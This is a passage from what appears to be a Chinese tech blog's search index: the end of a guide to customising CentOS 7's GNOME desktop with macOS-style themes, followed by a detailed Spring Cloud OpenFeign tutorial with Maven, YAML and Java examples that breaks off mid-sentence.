window-list@gnome-shell-extensions.gcampax.github.com.tar.gz window-list@gnome-shell-extensions.gcampax.github.com# 删除文件# rm -rf window-list@gnome-shell-extensions.gcampax.github.com# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，可以发现底部任务栏已经消失 (adsbygoogle = window.adsbygoogle || []).push({}); 系统主题介绍 GNOME 的应用主题可以从这里获取得到，建议可以选择 macOS 主题。图标主题可以从这里获取得到，建议可以选择 macOS 图标。选择主题的时候，需要留意对应的主题是否支持当前系统的 GTK 版本。其中系统主题分为以下几部分： Cursor Theme：/usr/share/icons/ Icons Themes：/usr/share/icons/ Shell Themes：/usr/share/icons/ GTK/Applications Themes：/usr/share/themes/ 基于 GTK2 安装 MacOS 主题 12345678# 查看gtk版本# pkg-config --list-all | grep gtk# 查看gtk的具体版本，如果上面显示gtk+-3.0，则将以下命令中的gtk+-2.0替换为gtk+-3.0# pkg-config --modversion gtk+-2.0# 安装gtk2依赖，如果是gtk3则不用安装# yum install gtk-murrine-engine gtk2-engines 12345678910# 下载应用主题文件，这里选择McHigh Sierra主题# wget https://xxxx/Sierra-dark.tar.xz# 解压应用主题文件# tar -xvf Sierra-dark.tar.xz# 拷贝应用主题文件# mv Sierra-dark /usr/share/themes/# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 外观，选择新增的应用主题即可 1234567891011# 下载图标主题文件# wget https://xxxx/02-McMojave-circle-black.tar.xz# 解压图标主题文件# tar -xvf 02-McMojave-circle-black.tar.xz# 拷贝图标主题文件# mv McMojave-circle-black /usr/share/icons# mv McMojave-circle-black-dark /usr/share/icons# 通过按下 Alt + F2 快捷键，然后输入 r 重启界面，导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 外观，选择新增的图标主题即可 启用用户自定义主题 导航到应用程序 –&gt; 附件 –&gt; 优化工具 –&gt; 扩展，找到”User themes”. 点击” 打开” 即启用，否则自定义的 Shell 主题不会生效。 应用程序程序窗口居中（方法一） 因为在 CentOS7 中打开新的窗口都会靠左上角显示，所以每次打开一个窗口都要多做一步操作，将窗口移到屏幕中间。如果不想这么麻烦，可以安装 ccsm（compizconfig-settings-manager）来设置窗口位置默认为居中。 1234567# 安装ccsm# yum install ccsm# 运行ccsm（使用普通用户身份）$ ccsm# 或者导航到应用程序 --&gt; 其他 --&gt; CompizConfig设置管理器 --&gt; 窗口管理 --&gt; 放置窗口 --&gt; 常规，首先勾选"启用放置窗口"，然后设置"安置模式"为居中，如下图所示 应用程序程序窗口居中（方法二） 如果通过 ccsm 无法设置窗口位置默认为居中，那么可以尝试使用 dconf-editor 来设置。 1234567# 安装dconf-editor# yum install dconf-editor# 运行dconf-editor（使用普通用户身份）$ dconf-editor# 打开/org/gnome/mutter选项卡，找到"center-new-windows"，然后点击启用按钮即可（如下图所示），然后通过按下 Alt + F2 快捷键，然后输入 r 重启界面 参考博客 CentOS7 完全装逼指南 如何使用 GNOME Shell 扩展 CentOS7 打造合适的科研环境 How to Install GNOME Shell Extensions Using GUI &amp; Command Line Interface var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"OpenFeign 入门教程 - 基础篇",url:"/posts/906bddbc.html",text:'Spring Cloud OpenFeign 介绍Feign 概述在使用 Spring Cloud 开发微服务应用时，各个服务提供者都是以 HTTP 接口的形式对外提供服务，因此在服务消费者调用服务提供者时，底层通过 HTTP Client 的方式访问。此时可以使用 JDK 原生的 URLConnection、Apache 的 HTTP Client、Netty 的异步 HTTP Client 或者 Spring 的 RestTemplate 去实现服务间的调用。但是最方便、最优雅的方式是通过 Feign 进行服务间的调用。Feign 是由 Netflix 开发的一个声明式的 Web Service 客户端，它的出现使开发 Web Service 客户端变得很简单；Feign 同时也是一款声明式、模板化的 HTTP 客户端。更多介绍可参考：Feign 项目、Spring Cloud Feign 官方中文教程 Spring Cloud OpenFeign 概述Spring Cloud OpenFeign 对 Feign 进行了二次封装，使得在 Spring Cloud 中使用 Feign 的时候，可以做到使用 HTTP 请求访问远程服务，就像调用本地方法一样的，开发者完全感知不到这是在调用远程访问，更感知不到在访问 HTTP 请求。Spring Cloud OpenFeign 增强了 Feign 的功能，使 Feign 有限支持 Spring MVC 的注解，如 @RequestMapping 等。OpenFeign 的 @FeignClient 注解可以解析 Spring MVC 的 @RequestMapping 注解下的接口，并通过动态代理的方式产生实现类，在实现类中做负载均衡并调用其他服务，默认集成了 Ribbon 与 Hystrix。更多介绍可参考：Spring Cloud OpenFeign 项目 Spring Cloud OpenFeign 的特性 Feign 最新特性一览图 支持 Hystrix 和 它的 Fallback 支持 HTTP 请求的响应和压缩 支持 Ribbon 的负载均衡客户端 支持可插拔的 HTTP 编码器和解码器 可插拔的注解支持，包括 Feign 注解 和 JAX-RS 注解 Feign 与 Spring Cloud OpenFeign 的选择Spring Cloud F 及 F 版本以上与 Spring Boot 2.0 以上一般使用 OpenFeign，如果从框架结构上看，OpenFeign 就是 2019 年 Feign 停更后出现的版本，也可以说大多数新项目都用 OpenFeign，而 2018 年以前的项目一般使用 Feign，大概可以这样粗率地划分。 Spring Cloud OpenFeign 入门案例1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，点击下载完整的案例代码。由于篇幅有限，下文中若没特殊说明，Feign 一般指的就是 Spring Cloud OpenFeign。 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 源服务工程为了测试 Feign 的 Web 服务客户端的功能，必须要有一个源服务（服务提供者），并且可以选择启动多个实例，在每个实例中需要有一个标识（例如端口）来识别每次的调用是到了不同的服务实例上。这里可以使用一份代码，采取改变端口号的方式启动多次，就能启动多个相同的服务实例。创建 Provider 的 Maven 工程后，由于需要将服务注册到 Eureka Server，工程下的 pom.xml 文件需要引入 spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableDiscoveryClient，将服务注册到 Eureka Server： 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider）、注册中心地址与端口号，后面启动多实例只需要修改这里的端口号即可： 12345678910111213server: port: 9090spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. 创建 Feign Client 工程创建 Feign Client 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-openfeign；若是使用旧版的 Spring Cloud，则改为引入 spring-cloud-starter-feign。另外由于需要从 Eureka Server 获取服务列表，即作为 Eureka 客户端，还需要引入 spring-cloud-starter-netflix-eureka-client。 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建启动主类，添加注解 @EnableFeignClients、@EnableDiscoveryClient 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class FeignApplication { public static void main(String[] args){ SpringApplication.run(FeignApplication.class, args); }} 创建服务接口类，用于调用 Provider 源服务： 123456@FeignClient(value = "PROVIDER")public interface ProviderClientService { @GetMapping("/provider/add") String add(@RequestParam("a") Integer a, @RequestParam("b") Integer b);} 创建用于测试的 Controller 类，因为需要创建一个 API 来供第三方调用 Provider 源服务的那个自定义 API： 1234567891011@RestControllerpublic class CalculateController { @Autowired private ProviderClientService clientService; @GetMapping("/add") public String add(Integer a, Integer b){ return clientService.add(a, b); }} 在 application.yml 文件中配置端口号、注册中心地址： 12345678910111213server: port: 8080spring: application: name: feign-clienteureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 6. 测试 启动 Eureka Server 后，更改 Provider 源服务的端口号为 9091 与 9092 后分别启动，浏览器访问 http://127.0.0.1:8090，查看 Eureka Server 的界面是否正常显示多个 Provider 源服务 启动 Feign Client 应用，浏览器访问 http://localhost:8080/add?a=3&amp;b=9，若正常返回计算结果，说明整个项目运行成功 提示：由于 Feign 默认集成了 Ribbon（客户端负载均衡），当存在多个服务提供者时，Feign 默认会使用轮询的方式访问源服务，此外 Feign 对服务实例节点的增减也能动态感知 Spring Cloud OpenFeign 基础功能Feign 的工作原理 开发微服务应用时，在主程序入口添加 @EnableFeignClients 注解开启对 Feign Client 扫描加载处理。根据 Feign Client 的开发规范，需要定义接口并添加 @FeignClient 注解。 当程序启动时，会进行包扫描，扫描所有标注了 @FeignClient 注解的类，并将这些信息注入 Spring IOC 容器中。 当定义的 Feign 接口中的方法被调用时，通过 JDK 的代理方式，来生成具体的 RequestTemplate。生成代理时，Feign 会为每个接口方法创建一个 RestTemplate 对象，该对象封装了 HTTP 请求需要的全部信息，如请求参数名、请求方法等信息都在这个过程中确定。 然后由 RestTemplate 生成 Request，接着把 Request 交给 Client 去处理，这里指的 Client 可以是 JDK 原生的 URLConnection、Apache 的 Http Client、也可以是 Okhttp。最后 Client 被封装到 LoadBalanceClient 类中，这个类结合 Ribbon 客户端负载均衡发起服务间的调用。 @FeignClient 注解的属性 name：指定 FeignClient 的名称，如果项目使用了 Ribbon，那么 name 属性会作为微服务的名称，用于服务发现 url：一般用于调试，可以手动指定 @FeignClient 调用的服务地址 decode404：当发生 404 错误时，如果该字段值为 true，会调用 decoder 进行解码，否则抛出 FeignException configuration：Feign 配置类，可以自定义 Feign 的 Encoder、Decoder、LogLevel、Contract fallback：定义容错的处理类，当调用远程接口失败或超时，会调用对应接口的容错逻辑，fallback 指定的类必须实现 @FeignClient 标记的接口 fallbackFactory：工厂类，用于生成 fallback 类示例，通过这个属性可以实现每个接口通用的容错逻辑，减少重复的代码 path：定义当前 FeignClient 的统一前缀 Feign 属性文件配置若希望对单个指定特定名称的 Feign 进行配置，此时可以将 @FeignClient 注解的属性配置写在 application.yml 或者 application.properties，配置示例如下： 12345678910111213141516feign: client: config: feignName: # 需要配置的FeignName connectTimeout: 5000 # 连接超时时间 readTimeout: 5000 # 读超时时间设置 loggerLevel: full # 配置Feign的日志级别 errorDecoder: com.example.SimpleErrorDecoder # Feign的错误解码器 retryer: com.example.SimpleRetryer # 配置重试 requestInterceptors: # 配置拦截器 - com.example.FooRequestInterceptor - com.example.BarRequestInterceptor decode404: false encoder: com.example.SimpleEncoder # Feign的编码器 decoder: com.example.SimpleDecoder # Feign的解码器 contract: com.example.SimpleContract # Feign的Contract配置 作用于所有 Feign 的配置方式，如果想使用 application.yml 或者 application.properties 来配置所有 Feign，可以使用下述配置： 1234567feign: client: config: default: readTimeout: 5000 loggerLevel: full connectTimeout: 5000 @EnableFeignClients 注解上有个 defaultConfiguration 属性，可以将默认配置统一写在一个配置类中，然后在主程序入口用 defaultConfiguration 来应用配置类，该配置方式同样可以作用于所有 Feign 123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClients(defaultConfiguration = DefaultFeignConfiguration.class)public class FeignApplication { public static void main(String[] args){ SpringApplication.run(FeignApplication.class, args); }} 特别注意：如果通过 Java 代码的方式配置过 Feign，然后又通过 application.yml 或者 application.properties 属性文件的方式配置 Feign，默认情况下属性文件中 Feign 的配置会覆盖 Java 代码的配置。但是可以通过使用参数 feign.client.default-to-properties=false 来改变 Feign 配置生效的优先级。 Feign Client 开启日志Feign 为每一个 FeignClient 都提供了一个 feign.Logger 实例，可以在配置中开启日志，开启方式比较简单，分为两步。 第一步：在 application.yml 中配置日志输出，默认情况下，记录器的名称是用于创建 Feign 客户端的接口的完整类名，Feign 日志记录仅响应 DEBUG 级别 123logging: level: com.springcloud.study.service.ProviderClientService: debug 第二步：通过 Java 代码的方式配置日志 Bean，可以配置在主程序入口类或者带有 @Configuration 注解的类，作用是通过配置的 Logger.Level 对象告诉 Feign 记录哪些日志内容 1234567891011121314151617@Configurationpublic class FeignServiceConfig { /** * Logger.Level 的具体级别如下： * NONE：不记录任何信息 * BASIC：仅记录请求方法、URL以及响应状态码和执行时间 * HEADERS：除了记录 BASIC级别的信息外，还会记录请求和响应的头信息 * FULL：记录所有请求与响应的明细，包括头信息、请求体、元数据 * * @return */ @Bean Logger.Level feignLoggerLevel() { return Logger.Level.FULL; }} Feign 开启 GZIP 压缩Feign 支持对请求和响应进行 GZIP 压缩，以此提高通信效率，下述内容配置了 Consumer 通过 Feign 到 Provider 的请求与相应的 Gzip 压缩（在服务消费者端配置） 12345678feign: compression: request: enabled: true mime-types: text/xml,application/xml,application/json # 配置压缩支持的MIME TYPE min-request-size: 2048 # 配置压缩数据大小的下限 response: enabled: true # 配置响应GZIP压缩 由于开启 GZIP 压缩后，Feign 之间的调用是通过二进制协议进行传输的，若服务之间的调用结果出现了乱码，此时可以将返回值的类型修改为 ResponseEntity&lt;byte[]&gt;，其中的 Controller 类 与被 @FeignClient 注解标注的接口都要修改 123456@FeignClient(value = "PROVIDER")public interface ProviderClientService { @GetMapping("/provider/say") ResponseEntity&lt;byte[]&gt; String say(@RequestParam("msg") String msg);} 1234567891011@RestControllerpublic class CalculateController { @Autowired private ProviderClientService clientService; @GetMapping("/say") public ResponseEntity&lt;byte[]&gt; say(String msg){ return clientService.say(msg); }} 验证压缩效果，首先开启 Feign 的日志输出，然后分别启用 Feign 压缩与关闭 Feign 压缩，观察前后输出的日志信息： 关闭 GZIP 压缩的 Request 12---&gt; GET http://PROVIDER/provider/say?msg=hello HTTP/1.1---&gt; END HTTP (0-byte body) 开启 GZIP 压缩的 Request，增加了 Accept-Encoding: gzip，证明 Request 开启了 GZIP 压缩 1234---&gt; GET http://PROVIDER/provider/say?msg=hello HTTP/1.1Accept-Encoding: gzipAccept-Encoding: deflate---&gt; END HTTP (0-byte body) Feign 的超时设置Feign 的调用分为两层，即 Ribbon 的调用和 Hystrix 的调用；其中高版本的 Feign 默认关闭了 Hystrix，而 Ribbon 默认是启用了。首先根据超时的异常日志信息，判断是 Ribbon 超时 还是 Hystrix 超时导致了异常的发生，然后根据判断结果添加 Ribbon 或者 Hystrix 的超时配置信息即可。例如：下述配置内容是针对 provider 服务添加与 Ribbon 超时相关的配置参数： 1234PROVIDER: ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 Feign 使用注意事项 在 Feign Client 接口中，不支持 GET 方法直接绑定 POJO 等复杂对象 在 Feign Client 接口中，如果使用到 @PathVariable，必须指定其 value 在 Feign Client 接口中，不能使用 @GetMapping 之类的组合注解，只支持使用 @RequestMapping 这类基础注解 @FeignClient 的属性中，serviceId 属性已经失效，推荐使用 name 属性 @FeignClient 的属性中，在老版本的 Spring Cloud 使用 url 属性时，不需要提供 name 属性；但在新版本中里必须提供 name 属性，并且 name、url 属性支持占位符 若需要自定义单个 Feign Client 的配置，此时被 @Configuration 注解标注的类，不允许被 @ComponentScan 注解扫描到，否则将会导致所有的 Feign Client 都会使用该配置 Spring Cloud OpenFeign 实战应用Feign 默认 Client 的替换Feign 在默认情况下使用的是 JDK 原生的 URLConnection 发送 HTTP 请求，没有使用连接池，但是对每个地址都会保持一个长连接，即利用 HTTP 的 persistence connections。开发者可以用 Apache 的 HTTP Client 替换 Feign 原始的 HTTP Client，通过设置连接池、超时时间等对服务之间的调用进行调优。通过查看源码，在类 feign.Client.Default 中可以看到以下代码，默认执行 HTTP 请求的就是 URLConnection。而在类 org.springframework.cloud.openfeign.ribbon.FeignRibbonClientAutoConfiguration 中，可以看到引入了三个类：HttpClientFeignLoadBalancedConfiguration、OkHttpFeignLoadBalancedConfiguration、DefaultFeignLoadBalancedConfiguration，其中可以看到在 DefaultFeignLoadBalancedConfiguration 中，使用的是 feign.Client.Default，即使用了 URLConnection。 1234567public static class Default implements Client { public Response execute(Request request, Options options) throws IOException { HttpURLConnection connection = this.convertAndSend(request, options); return this.convertResponse(connection).toBuilder().request(request).build(); }} 12345678class DefaultFeignLoadBalancedConfiguration { @Bean @ConditionalOnMissingBean public Client feignClient(CachingSpringLoadBalancerFactory cachingFactory, SpringClientFactory clientFactory) { return new LoadBalancerFeignClient(new Default((SSLSocketFactory)null, (HostnameVerifier)null), cachingFactory, clientFactory); }} 使用 HTTP Client 替换使用 Apache HTTP Client 替换 Feign 默认的 Client，替换步骤非常简单，只需要在 pom.xml 与 application.yml 分别添加以下配置内容即可： 123456789101112&lt;!-- 引入 HTTP Client --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- 引入 Feign 对 Http Client 的支持 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.netflix.feign&lt;/groupId&gt; &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt; &lt;version&gt;8.17.0&lt;/version&gt;&lt;/dependency&gt; 123feign: httpclient: enabled: true 验证默认 Client 的替换，在类 HttpClientFeignLoadBalancedConfiguration 上，声明了注解 @ConditionalOnClass(ApacheHttpClient.class)、@ConditionalOnProperty(value = "feign.httpclient.enabled", matchIfMissing = true)，即只有在 ApacheHttpClient 类存在且 feign.httpclient.enabled 为 true 时才会启用配置。此时可以在 HttpClientFeignLoadBalancedConfiguration.feignClient() 方法里打上断点（约第 43 行），重新启动项目，可以看到确实进行了 ApacheHttpClient 的声明；再将 feign.httpclient.enabled 设置为 false 后，断点就进不来了，由此可以验证 ApacheHttpClient 替换成功。 使用 Okhttp 替换使用 Okhttp 替换 Feign 默认的 Client，同样只需要在 pom.xml 与 application.yml 分别添加以下配置内容；验证是否替换成功，具体可以参考上述验证步骤，在 OkHttpFeignLoadBalancedConfiguration.feignClient() 方法里打断点调试。 12345&lt;!-- 引入 Feign 对 Okhttp 的支持 --&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt; &lt;artifactId&gt;feign-okhttp&lt;/artifactId&gt;&lt;/dependency&gt; 123feign: okhttp: enabled: true 若需要对 Okhttp 进行个性化的参数设置，可参考以下代码，其中 Okhttp 的特性有： 支持 SPDY，可以合并多个到同一个主机的请求 使用连接池技术减少请求的延迟（如果 SPDY 是可用的话） 使用 GZIP 压缩减少传输的数据量 缓存响应结果，避免重复的网络请求 1234567891011121314151617181920@Configuration@ConditionalOnClass(Feign.class)@AutoConfigureBefore(FeignAutoConfiguration.class)public class FeignOkHttpConfig { @Bean public okhttp3.OkHttpClient okHttpClient(){ return new okhttp3.OkHttpClient.Builder() //设置连接超时 .connectTimeout(60, TimeUnit.SECONDS) //设置读超时 .readTimeout(60, TimeUnit.SECONDS) //设置写超时 .writeTimeout(60,TimeUnit.SECONDS) //是否自动重连 .retryOnConnectionFailure(true) .connectionPool(new ConnectionPool()) //构建OkHttpClient对象 .build(); }} Post 和 Get 的多参数传递多参数传递方案介绍在企业项目的开发过程中，使用 Feign 实现服务与服务之间的调用时，无法避免多参数的传递。众所周知，在 Web 开发中 Spring MVC 是支持 GET 方法直接绑定 POJO 的，但是 Feign 的实现并未覆盖所有 Spring MVC 的功能，目前解决方式很多，最常见的解决方式如下： 将方法参数封装成 Map 传递 通过 Feign 拦截器的方式处理（推荐） 将 POJO 拆散一个个单独的属性放在方法参数里 使用 GET 传递 @RequestBody，但此方式违反了 Restful 规范 多参数传递的示例代码这里主要介绍通过 Feign 拦截器处理的方式，通过实现 Feign 的 RequestInterceptor 中的 aplly 方法，来进行统一拦截转换处理 Feign 中的 GET 方法多参数传递的问题。由于篇幅有限，下面只贴出核心代码，完整的示例代码可以点击这里下载。 为了方便测试服务之间的接口调用，在 Consumer 端（服务消费者）整合 Swagger2， pom.xml 加入以下配置： 1234567891011&lt;!-- Swagger2 --&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt;&lt;/dependency&gt; 在 Consumer 端（服务消费者）编写 Feign 拦截器代码，由于 Feign 不支持 GET 方法传 POJO，因此手动将 Json Body 转换为 Query： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455@Componentpublic class FeignRequestInterceptor implements RequestInterceptor { @Autowired private ObjectMapper objectMapper; @Override public void apply(RequestTemplate template) { // Feign 不支持 GET 方法传 POJO, 将 Json Body 转换为 Query if (template.method().equals("GET") &amp;&amp; template.body() != null) { try { JsonNode jsonNode = objectMapper.readTree(template.body()); template.body(null); Map&lt;String, Collection&lt;String&gt;&gt; queries = new HashMap&lt;&gt;(); buildQuery(jsonNode, "", queries); template.queries(queries); } catch (IOException e) { // 根据实践项目情况处理此处异常 e.printStackTrace(); } } } private void buildQuery(JsonNode jsonNode, String path, Map&lt;String, Collection&lt;String&gt;&gt; queries) { if (!jsonNode.isContainerNode()) { // 叶子节点 if (jsonNode.isNull()) { return; } Collection&lt;String&gt; values = queries.get(path); if (null == values) { values = new ArrayList&lt;&gt;(); queries.put(path, values); } values.add(jsonNode.asText()); return; } if (jsonNode.isArray()) { // 数组节点 Iterator&lt;JsonNode&gt; it = jsonNode.elements(); while (it.hasNext()) { buildQuery(it.next(), path, queries); } } else { Iterator&lt;Map.Entry&lt;String, JsonNode&gt;&gt; it = jsonNode.fields(); while (it.hasNext()) { Map.Entry&lt;String, JsonNode&gt; entry = it.next(); if (StringUtils.hasText(path)) { buildQuery(entry.getValue(), path + "." + entry.getKey(), queries); } else { // 根节点 buildQuery(entry.getValue(), entry.getKey(), queries); } } } }} 编写 Consumer 端（服务消费者）的 Feign Client 接口类： 1234567891011121314@FeignClient(name = "PROVIDER")public interface UserFeignService { /** * 默认情况下，Feign 不支持 GET 方法传 POJO * @param user * @return */ @RequestMapping(value = "/user/add", method = RequestMethod.GET) String addUser(User user); @RequestMapping(value = "/user/update", method = RequestMethod.POST) String updateUser(@RequestBody User user);} 使用 Swagger2，并编写 Consumer 端（服务消费者）的 Controller 类，用于调用 Feign Client 进行 GET 或者 POST 多参数传递 123456789101112131415161718192021222324252627282930@RestController@Api("用户管理相关接口")@RequestMapping("/user")public class UserController { @Autowired private UserFeignService userFeignService; /** * 用于演示Feign的Get请求多参数传递 * @param user * @return */ @ApiOperation("添加用户的接口") @RequestMapping(value = "/add", method = RequestMethod.GET) public String addUser(@ApiParam(name="用户",required=true) User user){ return userFeignService.addUser(user); } /** * 用于演示Feign的Post请求多参数传递 * @param user * @return */ @ApiOperation("更改用户的接口") @RequestMapping(value = "/update", method = RequestMethod.POST) public String updateUser( @RequestBody @ApiParam(name="用户",value="传入json格式",required=true) User user){ return userFeignService.updateUser(user); }} 编写 Provider 端（服务提供者）的 Controller 类，用于接收 Feign Client 的 GET 请求传递过来的 User 对象： 12345678910111213141516@RestController@RequestMapping("/user")public class UserController { @RequestMapping(value = "/add", method = RequestMethod.GET) public User addUser(User user) { System.out.println("==&gt; add: " + user.getId() + \'-\' + user.getName() + "-" + user.getAge()); return user; } @RequestMapping(value = "/update", method = RequestMethod.POST) public User updateUser(@RequestBody User user) { System.out.println("==&gt; update: " + user.getId() + \'-\' + user.getName() + "-" + user.getAge()); return user; }} 分别启动各个应用后，浏览器访问 http://127.0.0.1:8080/swagger-ui.html，通过 Swagger2 提供的 UI 界面测试对应的接口即可。 Feign 处理文件上传Netflix 开发的 Feign 早先不支持文件上传，后来虽支持但仍有缺陷，需要一次性完整地将文件读到内存再编码发送。在早期的 Spring Cloud 中，Feign 本身是没有文件上传功能的，要想实现文件上传功能，需要自行编写 Encoder 去实现文件上传。后来 Netflix 官方提供了子项目 feign-form，其中实现了文件上传所需的 Encoder。由于篇幅有限，下面只贴出核心代码，完整的示例代码可以点击这里下载。 在 Consumer 端（服务消费者）的 pom.mxl 文件添加以下内容： 1234567891011&lt;!-- Feign 文件上传--&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign.form&lt;/groupId&gt; &lt;artifactId&gt;feign-form&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign.form&lt;/groupId&gt; &lt;artifactId&gt;feign-form-spring&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt;&lt;/dependency&gt; 在 Consumer 端（服务消费者）中，指定 Feign Client 处理文件上传的编码器，特别注意：该配置类不能被 @ComponentScan 注解扫描到，否则该配置将应用到所有 Feign Client 1234567891011/** * Feign Client 配置（非全局生效） */@Configurationpublic class FeignMultipartSupportConfig { @Bean public Encoder multipartFormEncoder() { return new SpringFormEncoder(); }} 编写 Consumer 端（服务提供者）的 Feign 文件上传的客户端： 12345678910111213@FeignClient(name = "PROVIDER", configuration = FeignMultipartSupportConfig.class)public interface FileUploadFeignService { /*** * produces, consumes必填 * @param file * @return */ @RequestMapping(value = "/uploadFile", method = RequestMethod.POST, produces = {MediaType.APPLICATION_JSON_UTF8_VALUE}, consumes = MediaType.MULTIPART_FORM_DATA_VALUE) String fileUpload(@RequestPart(value = "file") MultipartFile file);} 使用 Swagger2，并编写 Consumer 端（服务提供者）的 Controller 类，用于上传文件： 1234567891011121314@RestController@Api(value = "文件上传接口")@RequestMapping("/feign")public class FeignUploadController { @Autowired private FileUploadFeignService fileUploadFeignService; @ApiOperation(value = "文件上传", notes = "请选择文件上传") @PostMapping(value = "/upload", consumes = MediaType.MULTIPART_FORM_DATA_VALUE) public String imageUpload(@RequestPart(value = "file") @ApiParam(value = "文件上传", required = true) MultipartFile file) throws Exception { return fileUploadFeignService.fileUpload(file); }} 编写 Provider 端（服务提供者）的 Controller 类，用于接收 Feign Client 上传的文件: 12345678@RestControllerpublic class FeignUploadController { @PostMapping(value = "/uploadFile", consumes = MediaType.MULTIPART_FORM_DATA_VALUE) public String fileUploadServer(@RequestPart(value = "file") MultipartFile file) throws Exception { return "file-name: " + file.getOriginalFilename() + " file-size: " + file.getSize(); }} 分别启动各个应用后，浏览器访问 http://127.0.0.1:8080/swagger-ui.html，通过 Swagger2 提供的 UI 界面上传文件即可。 Feign 处理首次请求失败当 